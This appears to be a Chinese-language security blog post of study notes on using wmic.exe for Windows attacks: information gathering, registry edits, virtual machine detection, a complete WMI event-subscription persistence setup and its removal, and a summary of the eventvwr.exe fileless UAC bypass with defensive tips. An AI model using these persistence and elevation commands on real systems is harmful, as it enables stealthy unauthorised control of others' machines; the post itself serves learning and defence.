---
layout: post
title: Study Notes of WMI Persistence using wmic.exe
---

## 0x00 前言
---
最近学习了Matt Graeber@mattifestation分享的方法《WMI Persistence using wmic.exe》，让我对WMI的攻击技巧有了新的认识，本文将结合之前的研究心得，分享利用wmic的一些技巧。

**参考资料：**

http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html

## 0x01 简介
---
在之前的文章《WMI Attacks》、《WMI Backdoor》、《WMI Defense》中分享了通过Poweshell和mof调用WMI实现的攻击技巧，
同样，使用wmic.exe也能达到相同的效果，而且更加直接，只要在cmd下直接运行命令就好。


## 0x02 搜集信息
---
**获取操作系统相关信息**

poweshell代码如下：

`Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem`

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-1.PNG)

换成wmic.exe的命令为：

`wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem`

回显如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-2.PNG)

**注：**

回显内容的格式没有对齐，需要添加参数指定输出格式

按照powershell回显的分行显示,需要添加如下参数：

`wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem GET /all /FORMAT:list`

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-3.PNG)

依此格式，其他通过powershell调用wmi查询的方法均可用wmic实现，例如：

powershell代码：

`Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem`

对应

`wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET /all /FORMAT:list`


将结果输出到文件的方法：

`wmic /OUTPUT:c:\test\1.txt /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET /all /FORMAT:list`




## 0x03 注册表操作

powershell代码如下：

`Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv`

`Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles`

`Get-ItemProperty Sys`

完整的wmic代码如下：

枚举子项：

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumKey ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles"`

注册表内容如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-4.PNG)

命令返回的结果如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-5.png)

**注：**

`Method execution successful`不代表一定能够获得正确的返回结果，此处需要注意参数的正确填写,如图2-6，故意漏掉",仍然提示`Method execution successful`，但返回结果错误

枚举指定的关键值：

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumValues  ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys"`

返回结果如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-7.png)


获取指定值的字符串数据值：

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call GetStringValue ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys","TasksDir"`

返回结果如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-8.png)

创建子项:

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call CreateKey ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test"`

返回结果如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/2-9.png)

**注：**

需要注意权限问题，此处需要管理员权限

设置一个命名值的字符串值：

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call SetStringValue ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test","Data","Name"`

返回结果如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/3-1.png)

**注：**
如果一个命名值不存在，则新建；如果存在，则为修改

删除子项：

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteKey ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test"`

删除设置一个命名值：

`wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteValue ^&H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test","Name"`


**注：**

以上参数说明参考自https://msdn.microsoft.com/en-us/library/aa393664(VS.85).aspx

特殊字符`^&H80000002`含义如下：

&H80000000 'HKEY_CLASSES_ROOT

&H80000001 'HKEY_CURRENT_USER

&H80000002 'HKEY_LOCAL_MACHINE

&H80000003 'HKEY_USERS

&H80000005 'HKEY_CURRENT_CONFIG





## 0x04 虚拟机检测

###  1、查看TotalPhysicalMemory和NumberOfLogicalProcessors

`wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET NumberOfLogicalProcessors,TotalPhysicalMemory /FORMAT:list`

返回结果如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/3-2.png)

### 2、查看当前进程

`wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Process GET Caption /FORMAT:list`



## 0x05 WMI Persistence
Powershell完整的实现代码如下：

```
$filterName = 'BotFilter82'
$consumerName = 'BotConsumer23'
$exePath = 'C:\Windows\System32\notepad.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
```

接下来分步介绍对应wmic调用的过程

### 1、Create an __EventFilter instance

`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`

### 2、Create an __EventConsumer instance

`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"`


### 3、Create a __FilterToConsumerBinding instance

`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""`


### 4、List the __EventFilter and __EventConsumer instances

**Filters：**

`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list`

**Event Consumers：**

`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list`

**Event Bindings：**

`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list`

通过powershell下查看的代码：

**Filters：**

`Get-WMIObject -Namespace root\Subscription -Class __EventFilter`
 
**Event Consumers：**

`Get-WMIObject -Namespace root\Subscription -Class __EventConsumer`
 
**Event Bindings：**

`Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding`



### 5、Remove all instances
**Filters：**

`wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE`

**Event Consumers：**

`wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE`


**Event Bindings：**

`wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='BotFilter82'" DELETE`

**注：**

wmic中Binding的Filter判断参数"BotFilter82"中"要变成'

通过powershell清除的实现代码：

**Filters：**

`Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose`
 
**Event Consumers：**

`Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose`
 
**Event Bindings：**

`Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose`


## 0x05 fileless uac bypass using eventvwr exe and registry hijacking

wmic的部分操作需要管理员权限，在这里补充一个刚学到的UACbypass技巧

**fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking**

**学习链接：**

https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

**作者：**

Matt Nelson @enigma0x3

### 原理

在进程eventvwr.exe启动的时候，首先查找注册表位置`HKCU\Software\Classes\mscfile\shell\open\command`,如果该处为空，接着查找注册表位置`HKCR\mscfile\shell\open\command`(此处默认值为`%SystemRoot%\system32\mmc.exe "%1" %*`),以高权限启动mmc.exe,最后打开eventvwr.msc。

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-8-16/3-3.png)


接下来，如果在注册表`HKCU\Software\Classes\mscfile\shell\open\command`中添加payload，就可以在启动mmc.exe之前执行预设的payload

**最重要的一点：**

修改注册表`HKCU\Software\Classes\mscfile\shell\open\command`的键值只需要普通用户权限即可


### 实现

作者分享了通过powershell实现的poc代码，链接如下：

https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1

如果poc成功执行，会在C:\UACBypassTest下写入"Is Elevated: True"

**注：**

默认操作c:\目录下的文件会被uac拦截

我fork了作者的代码，作了细微修改，运行如下命令：

`C:\Windows\System32\cmd.exe /c copy c:\test\1.txt c:\1.txt`

地址为：

https://github.com/3gstudent/UAC-Bypass/blob/master/Invoke-EventVwrBypass.ps1

### 优点

该方法同常规的方法有很大不同，优点如下：

- 无文件

- 不需要进程注入

- 不需要复制特权文件

### 适用环境

Win7

Win8.1

Win 10

### 防御

- set the UAC level to "Always Notify"

- remove the current user from the Local Administrators group

- alert on new registry entries in HKCU\Software\Classes\


---

[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
